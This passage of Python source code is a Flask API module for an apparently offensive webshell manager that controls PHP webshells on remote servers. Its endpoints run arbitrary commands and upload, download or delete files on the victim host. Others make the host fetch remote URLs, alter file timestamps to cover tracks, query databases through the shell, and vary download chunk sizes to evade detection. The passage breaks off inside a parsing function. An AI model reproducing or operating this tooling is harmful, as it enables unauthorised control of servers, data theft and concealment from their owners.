from flask import Blueprint, request, jsonify
import traceback
import os
import time
import tempfile


from .shell_factory import get_webshell_config_by_id, get_or_create_webshell_instance_by_id
from . import config as global_config
from .php.phpPayload import phpPayload

# 创建JSP专属功能蓝图
php_shell_bp = Blueprint('php_shell', __name__, url_prefix='/api/webshell/php')


@php_shell_bp.route('/executeCommand', methods=['POST'])
def execute_command():
    """执行webshell命令"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        command = data.get('command')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not command:
            return jsonify({'status': 'error', 'message': '命令不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({
                'status': 'error',
                'message': 'Webshell实例创建失败'
            })
        
        # 执行命令
        result = shell.execute_command(command)
        
        if result is not None:
            return jsonify({
                'status': 'success',
                'message': '命令执行成功',
                'data': {
                    'command': command,
                    'output': result
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '命令执行失败'
            })
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器内部错误: {str(e)}'
        }), 500

# ====== 文件操作接口 ======

@php_shell_bp.route('/getFiles', methods=['POST'])
def get_files():
    """获取指定目录的文件列表"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        path = data.get('path')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 调用get_files函数
        files_result = shell.get_files(path)
        
        if files_result is None:
            return jsonify({'status': 'error', 'message': '获取文件列表失败'}), 500
        
        # 解析文件列表
        file_list = parse_file_list_text(files_result)
        
        return jsonify({
            'status': 'success',
            'data': {
                'path': path,
                'files': file_list
            }
        })
        
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

def parse_file_list_text(files_text):
    """解析get_files返回的文件列表文本"""
    try:
        lines = files_text.strip().split('\n')
        file_list = []
        
        if len(lines) <= 1:
            return file_list
        
        # 第一行是目录路径，从第二行开始解析文件信息
        for line in lines[1:]:
            line = line.strip()
            if not line:
                continue
            
            try:
                # 使用正则表达式分割，处理文件名中可能包含空格的情况
                import re
                parts = re.split(r'\s+', line, maxsplit=5)
                
                if len(parts) < 5:
                    continue
                
                file_name = parts[0]
                file_type = parts[1]  # 0=目录, 1=文件
                date = parts[2]
                time = parts[3] 
                size = parts[4]
                permission = parts[5] if len(parts) > 5 else 'Unknown'
                
                # 构造文件信息
                file_info = {
                    'name': file_name,
                    'isDirectory': file_type == '0',
                    'lastModified': f"{date} {time}",
                    'size': int(size) if size.isdigit() else 0,
                    'permission': permission
                }
                
                file_list.append(file_info)
                
            except Exception as parse_error:
                print(f"[WARNING] 解析文件行失败: {line}, 错误: {parse_error}")
                continue
        
        return file_list
        
    except Exception as e:
        print(f"[ERROR] 解析文件列表失败: {e}")
        return []

@php_shell_bp.route('/uploadFile', methods=['POST'])
def upload_file():
    """上传文件（支持普通上传和大文件上传）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_path = data.get('filePath')
        file_data = data.get('fileData')
        use_big_upload = data.get('useBigUpload', False)  # 是否使用大文件上传
        chunk_position = data.get('chunkPosition', 0)  # 当前块在文件中的位置
        total_file_size = data.get('totalFileSize', 0)  # 完整文件大小
        chunk_mb_size = data.get('chunkMbSize', global_config.UPLOAD_CHUNK_MB_SIZE)  # 块大小（MB）
        delay_seconds = data.get('delaySeconds', global_config.UPLOAD_DELAY_SECONDS)  # 延迟时间（秒）
        max_retries = data.get('maxRetries', global_config.UPLOAD_MAX_RETRIES)  # 最大重试次数
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_path:
            return jsonify({'status': 'error', 'message': '文件路径不能为空'}), 400
        if not file_data:
            return jsonify({'status': 'error', 'message': '文件数据不能为空'}), 400
        
        print(f"[DEBUG] 上传文件请求: {file_path}, 大文件上传: {use_big_upload}, 块大小: {chunk_mb_size}MB")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 将文件数据转换为字节数组（如果是列表的话）
        if isinstance(file_data, list):
            file_data = bytes(file_data)
        
        if use_big_upload:
            # 使用大文件上传逻辑
            print(f"[DEBUG] 使用大文件上传模式")
            
            chunk_size = len(file_data)  # 当前块的大小
            chunk_mb_size_bytes = chunk_mb_size * 1024 * 1024  # 配置的块大小（字节）
            total_chunks = (total_file_size + chunk_mb_size_bytes - 1) // chunk_mb_size_bytes  # 总块数
            current_chunk_index = chunk_position // chunk_mb_size_bytes + 1  # 当前块索引（从1开始）
            
            print(f"[INFO] 总文件大小: {total_file_size} 字节，文件块传输进度: {current_chunk_index}/{total_chunks}")
            print(f"[INFO] 当前块位置: {chunk_position}, 当前块大小: {chunk_size} 字节")
            
            # 重试机制上传当前块
            success = False
            for retry in range(max_retries):
                try:
                    # 调用big_file_upload上传当前块
                    result = shell.big_file_upload(file_path, file_data, str(chunk_position))
                    
                    if result:
                        print(f"[DEBUG] 块 {current_chunk_index} 上传成功（位置: {chunk_position}）")
                        success = True
                        break
                    else:
                        print(f"[WARNING] 块 {current_chunk_index} 上传失败，重试 {retry + 1}/{max_retries}")
                        
                except Exception as chunk_error:
                    print(f"[ERROR] 块 {current_chunk_index} 上传异常: {chunk_error}")
                
                # 如果不是最后一次重试，等待一段时间
                if retry < max_retries - 1:
                    time.sleep(delay_seconds)
            
            if not success:
                return jsonify({
                    'status': 'error',
                    'message': f'大文件上传失败：块 {current_chunk_index} 上传失败，已重试 {max_retries} 次',
                    'data': {
                        'failedChunk': current_chunk_index,
                        'totalChunks': total_chunks,
                        'chunkPosition': chunk_position,
                        'progress': (chunk_position + chunk_size) / total_file_size * 100
                    }
                }), 500
            
            print(f"[SUCCESS] 块 {current_chunk_index} 上传完成: {file_path} (位置: {chunk_position})")
            
            return jsonify({
                'status': 'success',
                'message': f'块 {current_chunk_index} 上传成功',
                'data': {
                    'filePath': file_path,
                    'uploadMode': 'big',
                    'currentChunk': current_chunk_index,
                    'totalChunks': total_chunks,
                    'chunkPosition': chunk_position,
                    'chunkSize': chunk_size,
                    'totalFileSize': total_file_size,
                    'progress': (chunk_position + chunk_size) / total_file_size * 100
                }
            })
        else:
            # 使用普通上传逻辑
            print(f"[DEBUG] 使用普通上传模式")
            result = shell.upload_file(file_path, file_data)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件上传成功',
                    'data': {
                        'filePath': file_path,
                        'uploadMode': 'normal'
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件上传失败'
                }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@php_shell_bp.route('/downloadFile', methods=['POST'])
def download_file():
    """下载文件（支持普通下载和大文件下载）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        use_big_download = data.get('useBigDownload', False)  # 是否使用大文件下载
        chunk_kb_size = data.get('chunkKbSize')  # 块大小（KB），可选
        timeout_seconds = data.get('timeoutSeconds', 1.0)  # 下载请求间隔（秒），默认1.0秒
        enable_chunk_size_variation = data.get('enableChunkSizeVariation', False)  # 是否启用块大小浮动
        chunk_size_variation_kb = data.get('chunkSizeVariationKb', 128)  # 块大小浮动范围（KB）
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        
        print(f"[DEBUG] 下载文件请求: {file_name}, 大文件下载: {use_big_download}")
        if use_big_download:
            print(f"[DEBUG] 大文件下载参数: 块大小={chunk_kb_size}KB, 间隔={timeout_seconds}s, 浮动={enable_chunk_size_variation}, 浮动范围={chunk_size_variation_kb}KB")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        if use_big_download:
            # 使用大文件下载逻辑
            print(f"[DEBUG] 使用大文件下载模式")
            
            # 生成临时文件名用于下载
            temp_dir = tempfile.gettempdir()
            temp_filename = f"webshell_download_{int(time.time())}_{os.path.basename(file_name)}"
            temp_filepath = os.path.join(temp_dir, temp_filename)
            
            try:
                # 调用webshell的big_file_download方法，传递所有参数包括块浮动参数
                download_success = shell.big_file_download(
                    file_path=file_name, 
                    save_path=temp_filepath, 
                    chunk_kb_size=chunk_kb_size, 
                    timeout=timeout_seconds,
                    enable_chunk_size_variation=enable_chunk_size_variation,
                    chunk_size_variation_kb=chunk_size_variation_kb
                )
                
                if download_success:
                    # 读取下载的文件内容
                    with open(temp_filepath, 'rb') as f:
                        result = f.read()
                    print(f"[DEBUG] 大文件下载成功，文件大小: {len(result)} bytes")
                    
                    # 清理临时文件
                    os.remove(temp_filepath)
                else:
                    result = "大文件下载失败"
                    
            except Exception as e:
                print(f"[ERROR] 大文件下载异常: {e}")
                result = f"大文件下载异常: {str(e)}"
                # 清理可能存在的临时文件
                if os.path.exists(temp_filepath):
                    os.remove(temp_filepath)
        else:
            # 使用普通下载逻辑
            print(f"[DEBUG] 使用普通下载模式")
            result = shell.download_file(file_name)
        
        print(f"[DEBUG] 下载文件结果类型: {type(result)}")
        print(f"[DEBUG] 下载文件结果长度: {len(result) if result else 0}")
        
        if result is not None:
            # 检查是否是错误信息（字符串类型）
            if isinstance(result, str):
                # 检查常见的错误信息
                if 'file does not exist' in result.lower():
                    return jsonify({
                        'status': 'error',
                        'message': f'文件不存在: {file_name}'
                    }), 404
                elif 'permission denied' in result.lower():
                    return jsonify({
                        'status': 'error',
                        'message': f'权限不足: {file_name}'
                    }), 403
                elif 'no such file' in result.lower():
                    return jsonify({
                        'status': 'error',
                        'message': f'文件不存在: {file_name}'
                    }), 404
                elif result.strip() == '文件内容为空':
                    return jsonify({
                        'status': 'error',
                        'message': f'文件为空: {file_name}'
                    }), 400
                elif len(result.strip()) == 0:
                    return jsonify({
                        'status': 'error',
                        'message': f'文件为空: {file_name}'
                    }), 400
                
                # 如果是字符串但不是错误信息，说明是文本文件
                print(f"[DEBUG] 返回文本文件内容，长度: {len(result)} 字符")
                return jsonify({
                    'status': 'success',
                    'message': '文件下载成功',
                    'data': {
                        'fileName': file_name,
                        'content': result,
                        'contentType': 'text',
                        'downloadMode': 'big' if use_big_download else 'normal'
                    }
                })
            
            elif isinstance(result, bytes):
                # 如果是二进制文件，转换为base64编码
                import base64
                encoded_content = base64.b64encode(result).decode('utf-8')
                print(f"[DEBUG] 返回二进制文件内容，原始大小: {len(result)} bytes, base64大小: {len(encoded_content)} 字符")
                
                return jsonify({
                    'status': 'success',
                    'message': '文件下载成功',
                    'data': {
                        'fileName': file_name,
                        'content': encoded_content,
                        'contentType': 'binary',
                        'downloadMode': 'big' if use_big_download else 'normal'
                    }
                })
            
            else:
                # 未知类型
                return jsonify({
                    'status': 'error',
                    'message': f'未知的文件内容类型: {type(result)}'
                }), 500
        else:
            return jsonify({
                'status': 'error',
                'message': '文件下载失败：返回内容为空'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/deleteFile', methods=['POST'])
def delete_file():
    """删除文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 删除文件
        result = shell.delete_file(file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件删除成功',
                'data': {
                    'fileName': file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件删除失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@php_shell_bp.route('/newFile', methods=['POST'])
def new_file():
    """新建文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 新建文件
        result = shell.new_file(file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件创建成功',
                'data': {
                    'fileName': file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件创建失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@php_shell_bp.route('/newDir', methods=['POST'])
def new_dir():
    """新建目录"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        dir_name = data.get('dirName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not dir_name:
            return jsonify({'status': 'error', 'message': '目录名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 新建目录
        result = shell.new_dir(dir_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '目录创建成功',
                'data': {
                    'dirName': dir_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '目录创建失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@php_shell_bp.route('/copyFile', methods=['POST'])
def copy_file():
    """复制文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        src_file_name = data.get('srcFileName')
        dest_file_name = data.get('destFileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not src_file_name:
            return jsonify({'status': 'error', 'message': '源文件名不能为空'}), 400
        if not dest_file_name:
            return jsonify({'status': 'error', 'message': '目标文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 复制文件
        result = shell.copy_file(src_file_name, dest_file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件复制成功',
                'data': {
                    'srcFileName': src_file_name,
                    'destFileName': dest_file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件复制失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@php_shell_bp.route('/moveFile', methods=['POST'])
def move_file():
    """移动文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        src_file_name = data.get('srcFileName')
        dest_file_name = data.get('destFileName')
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not src_file_name:
            return jsonify({'status': 'error', 'message': '源文件名不能为空'}), 400
        if not dest_file_name:
            return jsonify({'status': 'error', 'message': '目标文件名不能为空'}), 400
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 移动文件
        result = shell.move_file(src_file_name, dest_file_name)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件移动成功',
                'data': {
                    'srcFileName': src_file_name,
                    'destFileName': dest_file_name,
                    'result': 'success'
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件移动失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@php_shell_bp.route('/zip', methods=['POST'])
def zip():
    """压缩文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        compress_paths = data.get('compressPaths')  # 要压缩的路径，可以是字符串或列表
        compress_file = data.get('compressFile')   # 压缩后的文件路径
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not compress_paths:
            return jsonify({'status': 'error', 'message': '压缩路径不能为空'}), 400
        if not compress_file:
            return jsonify({'status': 'error', 'message': '压缩文件路径不能为空'}), 400
        
        print(f"[DEBUG] 压缩文件请求: {compress_paths} -> {compress_file}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 执行压缩操作
        result = shell.zip(compress_paths, compress_file)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件压缩成功',
                'data': {
                    'compressPaths': compress_paths,
                    'compressFile': compress_file,
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件压缩失败'
            }), 500
        
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/unzip', methods=['POST'])
def unzip():
    """解压文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        compress_file = data.get('compressFile')   # 压缩文件路径
        extract_dir = data.get('extractDir')       # 解压目录路径
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not compress_file:
            return jsonify({'status': 'error', 'message': '压缩文件路径不能为空'}), 400
        if not extract_dir:
            return jsonify({'status': 'error', 'message': '解压目录路径不能为空'}), 400
        
        print(f"[DEBUG] 解压文件请求: {compress_file} -> {extract_dir}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 执行解压操作
        result = shell.unzip(compress_file, extract_dir)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件解压成功',
                'data': {
                    'compressFile': compress_file,
                    'extractDir': extract_dir,
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '文件解压失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/fileRemoteDownload', methods=['POST'])
def file_remote_download():
    """远程下载文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        download_url = data.get('downloadUrl')    # 远程下载URL
        save_path = data.get('savePath')          # 保存路径
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not download_url:
            return jsonify({'status': 'error', 'message': '下载URL不能为空'}), 400
        if not save_path:
            return jsonify({'status': 'error', 'message': '保存路径不能为空'}), 400
        
        print(f"[DEBUG] 远程下载文件请求: {download_url} -> {save_path}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        # 执行远程下载操作
        result = shell.file_remote_download(download_url, save_path)
        
        if result:
            return jsonify({
                'status': 'success',
                'message': '远程文件下载成功',
                'data': {
                    'downloadUrl': download_url,
                    'savePath': save_path
                }
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '远程文件下载失败'
            }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/setFileAttr', methods=['POST'])
def set_file_attr():
    """设置文件属性（权限或时间）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        webshell_id = data.get('webshell_id')
        file_path = data.get('filePath')
        attr_type = data.get('attrType')  # 'permission' 或 'time'
        
        # 参数验证
        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_path:
            return jsonify({'status': 'error', 'message': '文件路径不能为空'}), 400
        if not attr_type:
            return jsonify({'status': 'error', 'message': '属性类型不能为空'}), 400
        if attr_type not in ['permission', 'time']:
            return jsonify({'status': 'error', 'message': '属性类型必须是permission或time'}), 400
        
        print(f"[DEBUG] 设置文件属性请求: {file_path}, 类型: {attr_type}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500
        
        if attr_type == 'permission':
            # 修改文件权限
            permission = data.get('permission')
            if not permission:
                return jsonify({'status': 'error', 'message': '权限属性不能为空'}), 400
            
            # 验证权限格式（只允许R、W、X的组合）
            import re
            if not re.match(r'^[RWXrwx]+$', permission):
                return jsonify({'status': 'error', 'message': '权限格式无效，只允许RWX字母组合'}), 400
            
            # 转换为大写
            permission = permission.upper()
            
            print(f"[DEBUG] 设置文件权限: {file_path} -> {permission}")
            result = shell.set_file_permission(file_path, permission)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件权限设置成功',
                    'data': {
                        'filePath': file_path,
                        'permission': permission,
                        'attrType': 'permission'
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件权限设置失败'
                }), 500
                
        elif attr_type == 'time':
            # 修改文件时间
            modify_time = data.get('modifyTime')
            access_time = data.get('accessTime')
            
            # 至少需要一个时间参数
            if not modify_time and not access_time:
                return jsonify({'status': 'error', 'message': '至少需要提供一个时间参数'}), 400
            
            # 构造时间列表
            time_list = []
            
            # 修改时间
            if modify_time and modify_time.strip():
                # 验证时间格式
                try:
                    import datetime
                    datetime.datetime.strptime(modify_time, "%Y-%m-%d %H:%M:%S")
                    time_list.append(modify_time)
                except ValueError:
                    return jsonify({'status': 'error', 'message': '修改时间格式无效，请使用：YYYY-MM-DD HH:MM:SS'}), 400
            else:
                time_list.append("none")
            
            # 访问时间
            if access_time and access_time.strip():
                # 验证时间格式
                try:
                    import datetime
                    datetime.datetime.strptime(access_time, "%Y-%m-%d %H:%M:%S")
                    time_list.append(access_time)
                except ValueError:
                    return jsonify({'status': 'error', 'message': '访问时间格式无效，请使用：YYYY-MM-DD HH:MM:SS'}), 400
            else:
                time_list.append("none")
            
            print(f"[DEBUG] 设置文件时间: {file_path} -> 修改时间: {time_list[0]}, 访问时间: {time_list[1]}")
            result = shell.set_file_time(file_path, time_list)
            
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件时间设置成功',
                    'data': {
                        'filePath': file_path,
                        'modifyTime': modify_time if modify_time and modify_time.strip() else None,
                        'accessTime': access_time if access_time and access_time.strip() else None,
                        'attrType': 'time'
                    }
                })
            else:
                return jsonify({
                    'status': 'error',
                    'message': '文件时间设置失败'
                }), 500
            
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

# ====== 数据库管理接口 ======

@php_shell_bp.route('/testDatabaseConnection', methods=['POST'])
def test_database_connection():
    """测试数据库连接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'dbType', 'host', 'port', 'username', 'dbPassword']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        db_type = data['dbType']
        db_host = data['host']
        db_port = data['port']
        db_username = data['username']
        db_password = data['dbPassword']  # 这是数据库密码
        
        print(f"[INFO] 测试数据库连接: {db_type}://{db_host}:{db_port}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
             
        success, result_message = shell.test_database_connection(
            db_type=db_type,
            db_host=db_host,
            db_port=db_port,
            db_username=db_username,
            db_password=db_password,
        )
        
        if success:
            print(f"[SUCCESS] 数据库连接测试成功: {result_message}")
            return jsonify({
                'status': 'success',
                'message': '数据库连接测试成功',
                'data': {
                    'dbType': db_type,
                    'host': db_host,
                    'port': db_port,
                    'username': db_username,
                    'connectionDetails': result_message
                }
            })
        else:
            print(f"[ERROR] 数据库连接测试失败: {result_message}")
            return jsonify({
                'status': 'error',
                'message': f'数据库连接测试失败: {result_message}'
            }), 400
        
    except Exception as e:
        print(f"[ERROR] 测试数据库连接失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500


@php_shell_bp.route('/executeSql', methods=['POST'])
def execute_sql():
    """执行SQL语句"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400
        
        # 验证必需参数
        required_params = ['webshell_id', 'dbType', 'host', 'port', 'username', 'dbPassword', 'sql']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400
        
        webshell_id = data['webshell_id']
        db_type = data['dbType']
        db_host = data['host']
        db_port = data['port']
        db_username = data['username']
        db_password = data['dbPassword']  # 这是数据库密码
        sql_query = data['sql']
        
        # 验证SQL不为空
        if not sql_query or not sql_query.strip():
            return jsonify({'status': 'error', 'message': 'SQL语句不能为空'}), 400
        
        print(f"[INFO] 执行SQL语句: {db_type}://{db_host}:{db_port}")
        print(f"[DEBUG] SQL: {sql_query[:200]}{'...' if len(sql_query) > 200 else ''}")
        
        # 获取webshell实例
        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500
        
        # 检查是否为JavaShell类型
        if not hasattr(shell, 'exec_sql'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持数据库功能'}), 400
             
        # 判断是查询还是更新操作
        sql_lower = sql_query.strip().lower()
        is_select_query = sql_lower.startswith('select') or sql_lower.startswith('show') or sql_lower.startswith('desc') or sql_lower.startswith('explain')
        exec_type = 'select' if is_select_query else 'update'
        
        print(f"[DEBUG] SQL类型判断: {exec_type}")
        
        # 执行SQL语句
        success, result = shell.exec_sql(
            db_type=db_type,
            db_host=db_host,
            db_port=db_port,
            db_username=db_username,
            db_password=db_password,
            exec_type=exec_type,
            exec_sql=sql_query,
        )
        
        if success:
            print(f"[SUCCESS] SQL执行成功")
            
            if exec_type == 'select':
                # 处理查询结果
                try:
                    # 解析返回的数据
                    parsed_data = parse_database_query_result(result)
                    return jsonify({
                        'status': 'success',
                        'message': 'SQL查询执行成功',
                        'data': parsed_data,
                        'queryType': 'select'
                    })
                except Exception as parse_error:
                    print(f"[ERROR] 解析查询结果失败: {parse_error}")
                    return jsonify({
                        'status': 'error',
                        'message': f'解析查询结果失败: {str(parse_error)}'
                    }), 500
            else:
                # 处理更新结果
                return jsonify({
                    'status': 'success',
                    'message': 'SQL执行成功',
                    'data': result,
                    'queryType': 'update'
                })
        else:
            print(f"[ERROR] SQL执行失败: {result}")
            return jsonify({
                'status': 'error',
                'message': f'SQL执行失败: {result}'
            }), 400
        
    except Exception as e:
        print(f"[ERROR] 执行SQL失败: {e}")
        print(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

def parse_database_query_result(result_data):
    """
    解析数据库查询结果
    
    结果格式通常是：
    列名1    列名2    列名3
    值1     值2      值3
    值4     值5      值6
    ...
    
    其中列名和值都可能是Base64编码的
    """
    try:
        if not result_data or not result_data.strip():
            return []
        
        lines = result_data.strip().split('\n')
        if len(lines) < 2:  # 至少需要表头和一行数据
            return []
        
        # 解析表头（列名）
        header_line = lines[0]
        column_names = []
        
        # 按制表符分割并解码Base64
        raw_columns = header_line.split('\t')
        for col in raw_columns:
            if col.strip():
                try:
                    # 尝试Base64解码
                    import base64
                    decoded_col = base64.b64decode(col.strip()).decode('utf-8')
                    column_names.append(decoded_col)
                except Exception:
                    # 如果解码失败，直接使用原始值
                    column_names.append(col.strip())
        
